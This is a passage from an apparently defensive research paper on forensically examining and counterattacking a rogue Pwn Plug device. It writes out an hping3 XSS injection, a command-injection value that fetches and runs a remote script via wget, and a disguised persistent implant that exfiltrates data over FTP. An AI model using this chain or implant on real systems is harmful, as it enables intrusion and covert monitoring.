When running this command, “No such file or directory” errors are due to symbolic 
links that do not resolve correctly due to the root of the filesystem being located in a 
subdirectory of your analysis system. These errors can be safely ignored, since all actual 
files are being compared recursively from the root of both extractions. The resulting text 
file will contain a list of files that differ, and only exist in one extraction or another, and 
will exclude special device files that are not relevant to your analysis. An example 
output of comparing the commercial “Wireless” filesystem to the community edition is 
included in the file community_1.1_vs_wireless_1.1.txt. This should serve to 
illustrate the format of comparison output, as well as provide guidance on files that are 
different between commercial and community versions for analysts that do not have 
access to commercial Pwn Plug images. 
Once extracted and compared, analysis of the remaining files should seem familiar to 
analysts that are experienced in examining Linux systems. Some observations: 
• While the /etc/hostname set in the downloaded images is “polonus5”, the 
hostname of a recently purchased Pwn Plug was observed to be the MAC address 
of the unit, with no spaces or separators. 
• Information on DHCP leases acquired on various interfaces may be contained in  
/var/lib/dhcp/dhclient.leases. This may reveal information about what 
networks the device has been connected to. 
• /var/log contains a variety of log files that one would expect to find on Linux 
systems that may reveal information about the attacker’s activities. 
• Logs of connections to the web-based interface (including IP addresses) included 
with the commercial versions of the Pwn Plug OS are contained in /var/Pwn 
Plug/plugui/webrick.log 
• The web-based interface includes a button that launches a script to clean up log 
entries and command histories. While this script is obviously useful for an attacker 
to remove forensically interesting artifacts, it also serves as a good reference for an 
analyst of places that such information might exist when the device is seized. 
Vulnerability Analysis 
A variety of vulnerabilities were discovered in the web interface (PlugUI) that 
commercial Pwn Plug systems include and operate by default. The combination of these 
vulnerabilities allows for the complete, remote root compromise in the counterattack 
scenario described in the next section, “Counterattack Scenario and Toolkit”. 
Cross-Site Scripting (XSS) 
Cross-Site Scripting (XSS) is the result of web applications displaying user-supplied 
data in a way that does not suitably filter the data, allowing user-supplied data to run 
JavaScript code in the web browsers of other visitors of the web application. Attacker 
code running within the context of a web application can steal cookies, redirect users, 
and (in this case) can be used to trigger other vulnerabilities.  
The PlugUI interface presents the last ten lines of several log files. An example of this 
can be seen in the Passive Recon section of the interface. In the case of the HTTP 
requests displayed on this interface, if the “Host:” or “User-Agent” of a Pwn Plug-
sniffed web request contains scripting of the following form, JavaScript can be executed 
in the owner of the Pwn Plug’s web browser when they view the site: 
 alert(“XSS Demo”);// 
By crafting packets directly targeting the Pwn Plug, with the data segment containing 
text matching the regular expressions used by the monitoring process to log HTTP 
requests, we can easily load arbitrary scripts into the Passive Recon page to execute in 
the owner’s browser. Code to redirect the owner of the Pwn Plug to an attacker-
controlled page can be placed in PlugUI’s Passive Recon page with the following Linux 
command: 
hping3  -c 1 -p 80 -e ": GET\nHost:  
window.location.href="http://192.168.1.11:8000/exploit.
html";//\nUser-Agent: a\nReferer: a\nCookie: \a" 
Note that data sent to and logged by the Pwn Plug may not show up in the web 
interface for a short time after it is sent. This is due to the buffered IO delaying the write 
to the log file. In cases where JavaScript must be loaded into the owner’s browser 
quickly, or when it is suspected that a high volume of legitimate HTTP traffic may 
“push” your exploit code off the page, it may be a good idea to send duplicates of the 
crafted packets at short intervals until the owner views one. 
This attack is easiest exploited in this HTTP traffic viewing portion of PlugUI, though 
other portions of the interface may be similarly neglecting to filter output. If “Passive 
Recon” is currently disabled, this is not immediately exploitable in this way. Using the 
next vulnerability, however, an attacker could remotely activate the “Passive Recon” 
feature. 
Cross-Site Request Forgery (CSRF) 
Cross-Site Request Forgery (CSRF) vulnerabilities are the result of web applications not 
suitably verifying that HTML forms submitted were actually done so from the current 
site. Web forms should have unique identifiers set per-instantiation that can be verified 
upon submission. When exploited, other sites (or exploited portions of the current site) 
open in the same browser as an authenticated session to the vulnerable site can submit 
forms to the vulnerable site on the behalf of logged-in users. This is frequently used to 
forge requests through administrative users to add accounts or change security settings. 
In the PlugUI interface, none of the forms in any part of the interface contain unique 
identifiers, nor do the targets of the forms verify the source of the data (through 
referrals or otherwise). A combination of HTML and JavaScript can be used to cause the 
Pwn Plug owner’s web browser to make changes to the Pwn Plug from any site the 
owner visits. An attacker could easily direct a Pwn Plug owner to visit a page by either 
placing the exploit code in a page intentionally referenced by a URL in data logged by 
the Pwn Plug, or in the public webspace of Pwn Plug owner’s target organization. 
This vulnerability is used in the Counterattack Scenario & Toolkit section as a way to 
leverage the following command injection vulnerability. 
Command Injection 
Command injection vulnerabilities in web applications are the result of passing un-
sanitized user input into strings that are used as part of command-line arguments in the 
server-side of the web application. These are cases where a shell script or command is 
being launched by the web application. By manipulating the input, an attacker can take 
advantage of shell features (such as separating commands by “;” characters) to hijack 
control of the system call and execute arbitrary commands. 
In the PlugUI, the “Reverse Shells” section contains a number of form fields that are 
used to launch reverse shell connections back to the attacker. The values in these fields 
are eventually passed to the command-line unfiltered. By changing a field to include 
“;touch /root/proof_of_concept;” it can be observed that command execution 
can be obtained (though it may take a moment, as the commands get launched via a 
cron job that executes once per minute). 
This vulnerability may not seem immediately useful, since these forms are available 
only to users logged into the authenticated web interface of PlugUI. It is, however, 
leveraged without the consent of a logged-in user in the Counterattack Scenario & 
Toolkit section through the use of the previously described CSRF vulnerability (which 
is, in turn, leveraged by the XSS vulnerability). 
Mitigation - Stealth Mode 
The Pwn Plug documentation describes a “Stealth Mode” that disables all listening 
ports, including the SSH server and PlugUI web interface. This is described as an 
optional step when deploying the Pwn Plug into a target environment, and if set, it will 
close the attack surface used by these vulnerabilities and limit the counterattack  
scenario described in the following section. It is reasonable to assume, however, that an 
attacker might leave off “Stealth Mode” configuration due to it limiting options for 
connecting to the Pwn Plug unit (only reverse shells and serial console). When “Stealth 
Mode” is active, an organization wishing to counterattack the device would still have 
the more disruptive action of rebooting and gaining access through the serial console 
available. 
Counterattack Scenario & Toolkit 
Introduction 
It is possible to “counterattack” an Pwn Plug located in your organization in a scenario 
described as follows. There may be other possible scenarios where an attack can be 
launched against a Pwn Plug; this is simply one attack scenario identified as a result of 
this work. This counterattack allows for the installation of a monitoring program that 
periodically gathers data that may be useful in attributing the Pwn Plug to a specific 
owner, and identifying hosts, vulnerabilities, and data gathered by the Pwn Plug. This 
essentially turns the Pwn Plug into a honeypot that logs the actions of its owner. 
Pre-Requisites 
The following assumptions are made in the following sections’ description of this 
scenario. 
• The IP address of the Pwn Plug device must have been identified. 
• The PlugUI interface exists on the Pwn Plug and is currently activated. 
• The Passive Recon feature must be enabled, and the attacker must, at some point, 
check the results in PlugUI 
Note that in the Variations subsection later in this document, there is some discussion of 
how one could successfully counterattack a Pwn Plug device in scenarios where the 
above assumptions do not hold. 
Tools 
The following tools are used in this scenario (tools developed specifically for this 
research are included in the associated files): 
• exploit_packet_payload - Used as the payload for the packets sent via the 
hping3 command. First stage of exploitation 
• hping3 - used to craft and send arbitrary packets (publicly available) 
• Web server - any web server capable of hosting the files downloaded by the 
exploit and honeypot injected 
• FTP server - any FTP server set up with a limited account for incoming data 
transfers from the honeypot/monitoring software that will be installed on the Pwn 
Plug 
• pwnmon (filename: ubi.py) - Honeypot/monitoring software written specifically 
for this research that performs a variety of information gathering techniques on the 
Pwn Plug. Described in more detail in a future subsection. 
Scenario 
Given the above pre-requisites, the exploit_packet_payload contains the code that, will 
be rendered and executed in the “Passive Recon” section of the PlugUI interface 
(through the XSS) the following are the contents of this file: 
: GET 
Host:  
User-Agent: Hi 
Referer: Hi 
Cookie: Hi  
This file must be modified to change the URL (in bold here) to the URL where you have 
the supplied ubi.py hosted. Once suitable modifications are made, it can be sent to the 
Pwn Plug using the following hping3 command: 
sudo hping3 192.168.9.10 -c 1 -p 80 -E exploit_packet_payload -d 1100 
In some situations, this command must be sent multiple times over a period of time in 
order to ensure that it is being displayed in the last ten lines being displayed to the Pwn 
Plug operator when they go to the “Passive Recon” section. It may also take some time 
for a relatively low-traffic “Passive Recon” section to display the exploit code due to it 
being buffered. You may wish to send it several times to ensure that it is there when the 
operator views it. 
Once the Pwn Plug operator visits the “Passive Recon” page, a chain of events begins: 
• Via the XSS vulnerability, a hidden version of the “Reverse Shells” form is loaded, 
with crafted values 
• Notably, tcp_ssh[ip] is set to: ;cd /usr/sbin;wget 
http://192.168.9.187:8000/ubi.py;python ubi.py;rm ubi.py; 
• JavaScript code immediately submits this form to the PlugUI application (via the 
CSRF vulnerability), which sets up commands including the injected commands 
into an every-minute cron job (via the command-injection vulnerability). 
• A short while later, the injected commands execute: 
• ubi.py is downloaded from the web server 
• ubi.py is executed 
• It cleans up after the exploit and installs itself as honeypot/monitoring 
software (described in more detail in the next section). 
• ubi.py is deleted 
• At (the next) 17 minutes past the hour (when cron.hourly executes on the Pwn 
Plug), the installed honeypot/monitoring software gets launched independently of 
the web app from a cron job and begins its activities (described in more detail in 
the next section) 
• Every 10 minutes (configurable) 
• A collection of data from the Pwn Plug is uploaded to the FTP server 
• A script is downloaded and run from a configurable web site (for updates, 
additionally features, commands you’d like to run) 
Honeypot/Monitoring Software - pwnmon 
The pwnmon software was written as a payload for this counterattack scenario, and 
provides for monitoring the actions taken on Pwn Plug and the data that it collects and 
logs. It could easily be modified to run on other attacker-implanted devices as well. The 
following configuration options should be set before it is deployed: 
• ftp_host = '192.168.9.187'  
• ftp_user = 'pwnplug' 
• ftp_pass = 'password' 
• remote_script = 'http://192.168.9.187:8000/ubimount.py' 
• installed_location = '/usr/sbin/ubifsck' 
• installed_name = 'ubifsck' 
• lock_file = '/usr/sbin/ubichksum' 
• collection_prefix = 'pwnplug' 
• sleep_time = 600 
The “ubi” filenames are chosen to blend in with the utilities installed on the Pwn Plug 
for managing UBI filesystems. FTP credentials and web server addresses should be set 
accordingly for your scenario, and the collection prefix can be modified to differentiate 
multiple monitored pwnplugs. The sleep time is in seconds. 
The general actions taken by this software are as follows: 
• If it is being run as a result of the above-described exploits & scenario (filename is 
“ubi.py”) it will clean up after those exploits: 
• It nulls out the HTTP request results to keep that XSS/CSRF from firing again 
• It disables the reverse SSH configuration that was leveraged for command-
injection to prevent it from executing over and over again 
• It prevents itself from being run multiple times concurrently 
• It installs itself to “installed_location” 
• Sets up persistence (through rc.local and cron.hourly) 
• Disables the bash history clearing feature of the Pwn Plug 
• Every ten minutes (configurable) it will: 
• Run a script from your website, maybe to implement: 
• Upgrading pwnmon 
• Remote-imaging the Pwn Plug 
• Disabling the device 
• Extra gathering features 
• Anything you want! 
• Gather up the following information and tar.gz’s it: 
• Process list 
• Command history 
• Complete file listing 
• Network interfaces 
• Network connections 
• All log files (including for the PlugUI web app, Metasploit, etc.) 
• Uploads the collected information to your FTP server 
Variations 
• If the Pwn Plug owner can be convinced to visit a web site under your control 
(likely no huge feat), the XSS aspect of the above scenario can be skipped, and the 
web site can directly exploit the CSRF vulnerability in the Reverse Shell page. 
• In cases where the IP address of the Pwn Plug cannot be determined, the first 
stages of the attack could potentially be adapted and repeated across a range of IP 
addresses in order to identify the device. 
• The default IP address of the Pwn Plug as-shipped is 192.168.9.10. This knowledge 
could potentially be used to compromise Pwn Plug devices using CSRF exploits as 
the devices sit in their configuration/staging environments before they are even 
deployed by attackers. 
Conclusions 
It has been observed in this case study that it is possible to, upon identifying a “rogue” 
Pwn Plug within your organization, to forensically acquire an image of the device and 
analyze it with relative ease. Such a device can also be counter-attacked, either by 
overwhelming it with data to the point that it can log no more, or, more effectively, by 
leveraging vulnerabilities in its code. By using vulnerabilities of attack software against 
it, we can turn attacker-implanted devices into attacker-monitoring and honeypot 
devices. 
In addition, legitimate penetration testers that use such devices should be aware that 
vulnerabilities in the tools they use might expose them and their clients to compromise 
from third-party attackers. Devices being used by penetration testers are attractive 
targets for malicious attackers. Such devices should be restored to a known-good 
configuration between tests, and monitored for potential compromise. Penetration 
testers themselves should have the skillset necessary to protect themselves and monitor 
for compromise, in order to protect their clients.